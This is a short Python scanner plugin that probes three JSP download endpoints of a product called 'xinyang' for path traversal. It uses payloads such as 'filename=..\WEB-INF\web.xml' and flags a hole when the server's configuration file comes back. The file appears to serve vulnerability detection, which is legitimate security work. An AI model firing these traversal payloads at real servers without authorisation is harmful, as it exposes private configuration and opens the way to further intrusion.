#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0134085

import re

def assign(service, arg):
    if service == "xinyang":
        return True, arg
        
        
def audit(arg): 
    payloads= [
        'module/download.jsp?filename=..\WEB-INF\web.xml',
        'module/exceldown.jsp?filename=..\WEB-INF\web.xml',
        'module/exceldownload.jsp?filename=..\WEB-INF\web.xml'
        ]
    for payload in payloads:
        code, head, res, errcode, _ = curl.curl2(arg+payload)
        if code == 200 and ' <servlet-mapping>' in res  and 'web-app version' in res:
            security_hole(arg + payload + "   :file download")
        
        

            return arg
if __name__== '__main__':
    from dummy import *
